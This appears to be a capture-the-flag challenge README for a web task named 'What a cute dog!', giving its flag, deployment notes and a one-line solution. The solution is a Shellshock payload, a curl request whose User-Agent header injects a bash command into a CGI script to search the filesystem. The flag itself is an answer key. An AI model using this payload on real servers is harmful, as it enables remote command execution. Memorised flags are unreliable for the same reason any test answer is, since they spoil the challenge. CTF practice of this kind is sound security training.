# Web 350: What a cute dog!
**Author**: sandw1ch

**Flag**: RITSEC{sh3ll_sh0cked_w0wz3rs}

## Description
This dog is shockingly cute!

## Deployment
Host the Dockerfile!  
*Note: They also get RCE on the container so this may have to be respun up...*

## TL;DR Writeup
`curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'grep -r RITSEC /;'" http://localhost:80/cgi-bin/stats`

## Writeup
#TODO